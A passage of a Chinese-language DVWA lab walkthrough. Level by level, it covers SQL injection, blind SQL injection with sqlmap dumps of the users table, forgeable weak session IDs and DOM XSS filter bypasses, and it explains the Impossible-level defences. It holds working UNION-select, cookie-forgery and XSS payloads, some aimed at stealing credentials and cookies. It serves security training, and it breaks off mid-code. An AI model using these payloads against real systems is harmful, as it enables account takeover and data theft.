class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_curr</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));<br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_curr</span> );<br><br>    <span class="hljs-comment">// Check CAPTCHA from 3rd party</span><br>    <span class="hljs-variable">$resp</span> = <span class="hljs-title function_ invoke__">recaptcha_check_answer</span>(<br>        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">'recaptcha_private_key'</span> ],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'g-recaptcha-response'</span>]<br>    );<br></code></pre></td></tr></tbody></table></figure>
<p>这一关添加了token反正了CSRF，同时添加了要求用户填写当前密码的功能，也防止了SQL注入，接着判断验证码是否匹配。</p>
<p>很明显这里修改了前几个级别犯的错误，我们已经没有办法通过增删参数来绕过了。</p>
<h1>0x07 SQL Injection</h1>
<h2 id="Low-7">Low</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180252324.png" alt="image-20240112180252324"></p>
<p>如上图所示，这里显示判断数据库类型（并不需要在意），随后对用户输入的id参数进行拼接SQL语句查询，然后直接连接数据库查询对应id的数据，并未做出任何过滤，我们只需要正确闭合SQL语句即可</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">?id=<span class="hljs-number">1</span>' union select <span class="hljs-built_in">version</span>(), <span class="hljs-built_in">database</span>()--+&amp;Submit=Submit#<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180512510.png" alt="image-20240112180512510"></p>
<p>由于代码本身就支持展示多行数据，也就没必要搞什么分隔符之类的来明晰数据了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112181713231.png" alt="image-20240112181713231"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">?id=<span class="hljs-number">1</span>' union select user, password from users--+<br></code></pre></td></tr></tbody></table></figure>
<h2 id="Medium-7">Medium</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180632235.png" alt="image-20240112180632235"></p>
<p>修改的点在于采用<code>mysqli_real_escape_string</code>函数来对特殊字符进行转义，其中特殊字符如下图所展示</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180624680.png" alt="image-20240112180624680"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112180750061.png" alt="image-20240112180750061"></p>
<p>但这里幸运的是，改为了数字型查询。但这里有限制的点在于，当我们查到表名为users，接来下回去查询users中的列名，那无疑是需要单引号或者双引号包围的，但我们可以通过16进制绕过，因为SQL数据库对16进制数据会自动转换为10进制识别</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112181915754.png" alt="image-20240112181915754"></p>
<h2 id="High-7">High</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112184636745.png" alt="image-20240112184636745"></p>
<p>这一级别与第一关类似，只不过id的位置在session，并不在页面当中了</p>
<p>我们在input输入框中输入：<code>?id=-1' union select user, password from users--+</code>即可</p>
<h2 id="Impossible-7">Impossible</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112185242167.png" alt="image-20240112185242167"></p>
<p>这里多了一个token的验证，同时判断用户输入的id是否为数字类型，如果不是直接无效，如果是的话，强制转换为整数类型，接着采用PDO预编译，导致我们无法进行SQL语句的闭合</p>
<p>prepare 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>
<h1>0x08 SQL Injection (Blind)</h1>
<h2 id="Low-8">Low</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112185654418.png" alt="image-20240112185654418"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112185716349.png" alt="image-20240112185716349"></p>
<p>上述两处代码结合会发现，即使我们查询成功，也只会显示是否成功的消息展示，并不会将数据显示出来，这意味着我们只能进行盲注了</p>
<p>同时这与SQL注入类似，并不没有做出任何过滤</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">python3 sqlmap<span class="hljs-selector-class">.py</span> -u "http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/sqli_blind/?id=<span class="hljs-number">1</span>*&amp;Submit=Submit#<span class="hljs-string">" --cookie "</span>security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j" <span class="hljs-attr">--current-db</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192426242.png" alt="image-20240112192426242"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">python3 sqlmap<span class="hljs-selector-class">.py</span> -u "http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/sqli_blind/?id=<span class="hljs-number">1</span>*&amp;Submit=Submit#<span class="hljs-string">" --cookie "</span>security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j" -D dvwa <span class="hljs-attr">--tables</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192455049.png" alt="image-20240112192455049"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">python3 sqlmap<span class="hljs-selector-class">.py</span> -u "http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/sqli_blind/?id=<span class="hljs-number">1</span>*&amp;Submit=Submit#<span class="hljs-string">" --cookie "</span>security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j" -D dvwa -T users <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192607692.png" alt="image-20240112192607692"></p>
<h2 id="Medium-8">Medium</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192717645.png" alt="image-20240112192717645"></p>
<p>依旧是盲注，虽然这里对id参数做了特殊字符转移，但类似0x07的 SQL注入，我们依旧是可以绕过的，比如16进制。</p>
<p>交给sqlmap完全可以</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">python3 sqlmap<span class="hljs-selector-class">.py</span> -u "http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/sqli_blind/?id=<span class="hljs-number">1</span>*&amp;Submit=Submit#<span class="hljs-string">" --cookie "</span>security=medium; PHPSESSID=cp58onvdgg0k61kihafkofof9j" -D dvwa -T users <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192830472.png" alt="image-20240112192830472"></p>
<h2 id="High-8">High</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112192858971.png" alt="image-20240112192858971"></p>
<p>不同点在于id的位置换成了cookie，但仍然没有做出有效的限制，依旧可以sqlmap</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">python3 sqlmap<span class="hljs-selector-class">.py</span> -u "http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/sqli_blind/<span class="hljs-string">" --cookie "</span>id=<span class="hljs-number">1</span>*; security=high; PHPSESSID=cp58onvdgg0k61kihafkofof9j" -D dvwa -T users <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112200305536.png" alt="image-20240112200305536"></p>
<h2 id="Impossible-8">Impossible</h2>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112200425482.png" alt="image-20240112200425482"></p>
<p>这一等级同样采用了PDO的SQL预编译、防止CSRF，检查id是否为数字型。</p>
<h1>0x09 Weak Session IDs</h1>
<p>一种通过窃取用户SessionID，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。</p>
<p>SessionID还可以保存在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。</p>
<h2 id="Low-9">Low</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$html</span> = <span class="hljs-string">""</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">"POST"</span>) {<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id'</span>])) {<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id'</span>] = <span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id'</span>]++;<br>    <span class="hljs-variable">$cookie_value</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id'</span>];<br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"dvwaSession"</span>, <span class="hljs-variable">$cookie_value</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里的代码逻辑是，只要post方法请求一次，就会令session_id++，当然如果不存在的话，置零。</p>
<p>这很容易让攻击者伪造cookie，我们这里bp抓包一次发现如下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201226875.png" alt="image-20240112201226875"></p>
<p>当我们将这个cookie复制下来，然后换一个浏览器访问该weak_session_id对应的url，会发现不需要登录直接就到达指定url页面</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201210123.png" alt="image-20240112201210123"></p>
<h2 id="Medium-9">Medium</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$html</span> = <span class="hljs-string">""</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">"POST"</span>) {<br>    <span class="hljs-variable">$cookie_value</span> = <span class="hljs-title function_ invoke__">time</span>();<br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"dvwaSession"</span>, <span class="hljs-variable">$cookie_value</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里是采用时间戳作为session会话，但是这里时间戳也是有规律可循的，是可以伪造的。我们采用时间戳转换工具：</p>
<p><a target="_blank" rel="noopener" href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201820692.png" alt="image-20240112201820692"></p>
<p>这里我们可以选一个未来的时间，并转换为时间戳，接着我们可以诱骗用户在这一时间点击这一关的generate按钮</p>
<p>当其点击过之后，我们便可以成功进行伪造了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112201810896.png" alt="image-20240112201810896"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Cookie: dvwaSession=<span class="hljs-number">1705061825</span>; security_level=<span class="hljs-number">0</span>; ajs_anonymous_id=f11e1270-bf66-<span class="hljs-number">42</span>b5-b337-<span class="hljs-number">91</span>c6d4d5ff4f; ajs_user_id=<span class="hljs-number">048546</span>bfc1e19205a55a5993547bc9308acf5a9c; ocKey=<span class="hljs-number">512389862</span>aecb2132976ffe9960380f4; PHPSESSID=mc4bn9ou74faqboqg56aag47t0; security=medium<br></code></pre></td></tr></tbody></table></figure>
<p>将我们准备的时间戳伪造成cookie，接着换一个其他浏览器发送，即可绕过登录</p>
<h2 id="High-9">High</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$html</span> = <span class="hljs-string">""</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">"POST"</span>) {<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id_high'</span>])) {<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id_high'</span>] = <span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id_high'</span>]++;<br>    <span class="hljs-variable">$cookie_value</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'last_session_id_high'</span>]);<br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"dvwaSession"</span>, <span class="hljs-variable">$cookie_value</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>, <span class="hljs-string">"/vulnerabilities/weak_id/"</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_HOST'</span>], <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里与第一个low级别类似，不过这里的session经过了md5加密。我们bp抓包的时候可以很容易看出来md5的迹象的，经过一个解密即可知道是由数字0开始++之后得到的整数的md5加密值，依旧很容易构造</p>
<h2 id="Impossible-9">Impossible</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$html</span> = <span class="hljs-string">""</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">"POST"</span>) {<br>    <span class="hljs-variable">$cookie_value</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-title function_ invoke__">time</span>() . <span class="hljs-string">"Impossible"</span>);<br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"dvwaSession"</span>, <span class="hljs-variable">$cookie_value</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>, <span class="hljs-string">"/vulnerabilities/weak_id/"</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_HOST'</span>], <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里设置了随机数，然后拼接当前时间戳和impossible，最后经过sha1加密，如果我们不能得到随机数种子，以及后面的<code>Impossible</code>字符，是根本无法构造的。</p>
<p>这只是代码审计的前提下才知道其构造原理，如果单纯抓包等等，基本不可能判断出来其session产生原理。</p>
<h1>0x10 XSS(DOM)</h1>
<h2 id="Low-10">Low</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># No protections, anything goes</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>无任何保护。。。。</p>
<p>我们看一下页面关于此处的html源码</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"vulnerable_code_area"</span>&gt;</span><br><br>         <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Please choose a language:<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"XSS"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"default"</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">                    if (document.location.href.indexOf("default=") &gt;= 0) {</span></span><br><span class="language-xml"><span class="language-handlebars">                        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);</span></span><br><span class="language-xml"><span class="language-handlebars">                        document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'" + lang + "'</span>&gt;</span>" + $decodeURI(lang) + "<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span><br><span class="language-xml"><span class="language-handlebars">                        document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">''</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">'disabled'</span>&gt;</span>----<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span><br><span class="language-xml"><span class="language-handlebars">                    }</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">                    document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'English'</span>&gt;</span>English<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span><br><span class="language-xml"><span class="language-handlebars">                    document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'French'</span>&gt;</span>French<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span><br><span class="language-xml"><span class="language-handlebars">                    document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'Spanish'</span>&gt;</span>Spanish<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span><br><span class="language-xml"><span class="language-handlebars">                    document.write("<span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'German'</span>&gt;</span>German<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>");</span></span><br><span class="language-xml"><span class="language-handlebars">                </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Select"</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>很明显这里对用户的输入复制给了lang变量，接着在没有任何过滤的情况下直接进行url解码拼接到document.write函数下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112203626229.png" alt="image-20240112203626229"></p>
<h2 id="Medium-10">Medium</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">"default"</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'default'</span> ]) ) {<br>    <span class="hljs-variable">$default</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'default'</span>];<br>    <br>    <span class="hljs-comment"># Do not allow script tags</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span> (<span class="hljs-variable">$default</span>, <span class="hljs-string">"&lt;script"</span>) !== <span class="hljs-literal">false</span>) {<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">"location: ?default=English"</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    }<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里过滤了<code>&lt;script</code>标签，但我们还可以选择更多的标签来绕过</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">?default=&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-number">1</span> onerror=<span class="hljs-built_in">alert</span>('hacker')&gt;<br></code></pre></td></tr></tbody></table></figure>
<p>但毕竟我们换了标签，必须要闭合前面的标签，否则这里的img标签便不起作用了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112204025723.png" alt="image-20240112204025723"></p>
<p>闭合option与select标签即可</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">?default=&lt;/option&gt;&lt;/select&gt;&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-number">1</span> onerror=<span class="hljs-built_in">alert</span>('hacker')&gt;<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112204419920.png" alt="image-20240112204419920"></p>
<h2 id="High-10">High</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">"default"</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'default'</span> ]) ) {<br>    <span class="hljs-comment"># White list the allowable languages</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'default'</span>]) {<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">"French"</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">"English"</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">"German"</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">"Spanish"</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">"location: ?default=English"</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    }<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里说如果default的值不是上面四个指定的值中的一个，则直接无效，这里学了师傅们的两个思路</p>
<p>方法一：可以使用 <code>&amp;</code> 连接另一个自定义变量来 Bypass</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">?default=English&amp;<span class="hljs-selector-tag">a</span>=&lt;/option&gt;&lt;/select&gt;&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=x onerror=<span class="hljs-built_in">alert</span>('XSS')&gt;<br><br>?default=English&amp;<span class="hljs-selector-tag">a</span>=&lt;<span class="hljs-selector-tag">input</span> onclick=<span class="hljs-built_in">alert</span>('XSS') /&gt;<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112204856429.png" alt="image-20240112204856429"></p>
<p>方法二：使用<code>#</code>来 Bypass</p>
<p>注：在url中#后边的内容不会发送到服务端，从而可以实现绕过。</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">?default=English#&lt;/option&gt;&lt;/select&gt;&lt;<span class="hljs-selector-tag">BODY</span> ONLOAD=<span class="hljs-built_in">alert</span>(document.cookie)&gt;<br>?default=English#&lt;<span class="hljs-selector-tag">input</span> onclick=<span class="hljs-built_in">alert</span>('document.cookie') /&gt;<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112205022569.png" alt="image-20240112205022569"></p>
<h2 id="Impossible-10">Impossible</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># Don't need to do anything, protection handled on the client side</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112205131439.png" alt="image-20240112205131439"></p>
<p>可以看见客户端这里对我们的输入的数据不进行url解码了，这样会导致标签失效，从而无法 XSS</p>
<h1>0x11 XSS(Reflected)</h1>
<h2 id="Low-11">Low</h2>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">"X-XSS-Protection: 0"</span>);<br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">"name"</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'name'</span> ] != <span class="hljs-literal">NULL</span> ) {<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Hello '</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'name'</span> ] . 